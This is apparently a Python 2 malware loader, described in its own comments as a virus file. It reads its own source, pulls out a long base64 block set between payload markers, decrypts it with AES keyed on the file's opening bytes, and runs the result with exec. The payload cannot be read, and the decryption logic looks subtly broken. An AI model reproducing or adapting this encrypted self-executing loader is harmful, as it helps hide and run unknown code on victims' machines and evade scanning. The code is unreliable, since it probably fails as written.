print "Hello0000000000000sfhldskjfhdjslakfhdjlksafhjldsakhfjads"

######################################################## First script python
# coding=utf-8
# Start Unencrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Unencrypted
# Start payload
#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
# End payload